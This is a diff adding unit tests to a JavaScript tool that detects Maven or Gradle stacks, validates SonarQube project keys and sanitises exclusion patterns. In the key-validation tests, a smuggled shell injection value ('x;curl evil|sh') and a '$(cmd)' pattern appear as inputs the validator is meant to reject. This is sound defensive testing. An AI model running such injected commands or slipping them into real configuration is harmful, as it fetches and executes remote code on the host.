@@ -230,6 +230,53 @@ describe('detect stacks', () => {
     // Act and Assert
     assert.throws(act, /--root is required/);
   });
+
+  test('--stack gradle resolves the ask with the gradle scanner', () => {
+    // Arrange
+    const setup = {
+      files: ['pom.xml', 'build.gradle'],
+      texts: { 'build.gradle': SONAR_GRADLE },
+      dirs: ['build', 'target']
+    };
+    // Act
+    const res = detect({ root: ROOT, stack: 'gradle' }, repo(setup));
+    // Assert
+    assert.equal(res.stack, 'gradle');
+    assert.equal(res.jdk, 21);
+    assert.equal(res.scanCommand, 'scan-gradle');
+    assert.equal(res.ask, undefined);
+    assert.ok(res.exclusions.includes('**/build/**'));
+    assert.ok(!res.exclusions.includes('**/target/**'));
+  });
+
+  test('--stack maven resolves the ask with the maven scanner', () => {
+    // Arrange
+    const setup = { files: ['pom.xml', 'build.gradle'], texts: { 'build.gradle': SONAR_GRADLE }, dirs: ['target'] };
+    // Act
+    const res = detect({ root: ROOT, stack: 'maven' }, repo(setup));
+    // Assert
+    assert.equal(res.stack, 'maven');
+    assert.equal(res.jdk, 21);
+    assert.equal(res.scanCommand, 'scan-maven');
+    assert.ok(res.exclusions.includes('**/target/**'));
+  });
+
+  test('--stack cli throws', () => {
+    // Arrange
+    const act = () => detect({ root: ROOT, stack: 'cli' }, repo({ files: ['package.json'] }));
+    // Act and Assert
+    assert.throws(act, /--stack must be maven or gradle/);
+  });
+
+  test('--stack gradle stops when no gradle build exists', () => {
+    // Arrange
+    const setup = { files: ['pom.xml'] };
+    // Act
+    const res = detect({ root: ROOT, stack: 'gradle' }, repo(setup));
+    // Assert
+    assert.equal(res.stop, 'no gradle build found');
+    assert.equal(res.stack, null);
+  });
 });
 
 describe('detect key', () => {
@@ -258,6 +305,71 @@ describe('detect key', () => {
     const res = detect({ root: '/work/api_2-svc' }, deps);
     // Assert
     assert.equal(res.key, 'api_2-svc');
+  });
+
+  test('accepts a key with a colon and a dot and derives a Docker-safe name', () => {
+    // Arrange
+    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': 'sonar.projectKey=org:app.v1\n' } };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.equal(res.key, 'org:app.v1');
+    assert.equal(res.name, 'cdk-sonar-org-app.v1');
+    assert.equal(res.stop, undefined);
+  });
+
+  test('derives the name of a fallback key', () => {
+    // Arrange
+    const deps = repo({ files: ['package.json'] });
+    // Act
+    const res = detect({ root: '/work/My App.v2' }, deps);
+    // Assert
+    assert.equal(res.name, 'cdk-sonar-my-app-v2');
+  });
+
+  test('stops on a key with shell metacharacters', () => {
+    // Arrange
+    const setup = {
+      files: ['package.json'],
+      texts: { 'sonar-project.properties': 'sonar.projectKey=x;curl evil|sh\n' }
+    };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.match(res.stop, /^invalid sonar\.projectKey: /);
+    assert.equal(res.key, null);
+    assert.equal(res.name, null);
+  });
+
+  test('stops on an all-digit key', () => {
+    // Arrange
+    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': 'sonar.projectKey=12345\n' } };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.match(res.stop, /invalid sonar\.projectKey: all digits/);
+    assert.equal(res.key, null);
+  });
+
+  test('stops on a key over 400 characters', () => {
+    // Arrange
+    const text = `sonar.projectKey=${'a'.repeat(401)}\n`;
+    const setup = { files: ['package.json'], texts: { 'sonar-project.properties': text } };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.match(res.stop, /invalid sonar\.projectKey: longer than 400/);
+    assert.equal(res.name, null);
+  });
+
+  test('stops on an all-digit fallback name and asks for sonar.projectKey', () => {
+    // Arrange
+    const deps = repo({ files: ['package.json'] });
+    // Act
+    const res = detect({ root: '/work/2024' }, deps);
+    // Assert
+    assert.match(res.stop, /set sonar\.projectKey/);
+    assert.equal(res.key, null);
   });
 });
 
@@ -398,6 +510,32 @@ describe('detect exclusions', () => {
     // Assert
     assert.equal(res.exclusions, '**/.scannerwork/**,**/.git/**');
     assert.deepEqual(res.excluded, []);
+  });
+
+  test('drops patterns with unsafe characters and lists them', () => {
+    // Arrange
+    const setup = {
+      files: ['pom.xml'],
+      texts: { 'sonar-project.properties': "sonar.exclusions='$(cmd)',a b/**,src/[x]/**,**/ok/**\n" }
+    };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.deepEqual(res.dropped, ["'$(cmd)'", 'a b/**', 'src/[x]/**']);
+    assert.equal(res.exclusions, '**/ok/**,**/.scannerwork/**,**/.git/**');
+  });
+
+  test('keeps safe globs and leaves dropped empty', () => {
+    // Arrange
+    const setup = {
+      files: ['pom.xml'],
+      texts: { 'sonar-project.properties': 'sonar.exclusions=src/{a}/**,x?.js\n' }
+    };
+    // Act
+    const res = run(setup);
+    // Assert
+    assert.ok(res.exclusions.startsWith('src/{a}/**,x?.js,'));
+    assert.deepEqual(res.dropped, []);
   });
 
   test('excludes no stack directory when the stack is undecided', () => {
@@ -577,6 +715,27 @@ describe('main', () => {
     // Assert
     assert.equal(code, 0);
     assert.equal(JSON.parse(io.out[0]).stack, 'maven');
+  });
+
+  test('detect passes --stack through', async () => {
+    // Arrange
+    const io = sink();
+    const files = ['pom.xml', 'build.gradle'];
+    const deps = { ...repo({ files, texts: { 'build.gradle': SONAR_GRADLE } }), ...io };
+    // Act
+    const code = await main(['detect', '--root', ROOT, '--stack', 'gradle'], deps);
+    // Assert
+    assert.equal(code, 0);
+    assert.equal(JSON.parse(io.out[0]).stack, 'gradle');
+  });
+
+  test('usage mentions the detect --stack option', async () => {
+    // Arrange
+    const io = sink();
+    // Act
+    await main([], io);
+    // Assert
+    assert.match(io.err[0], /detect --root <dir> \[--stack/);
   });
 
   test('tags prints the tag JSON', async () => {
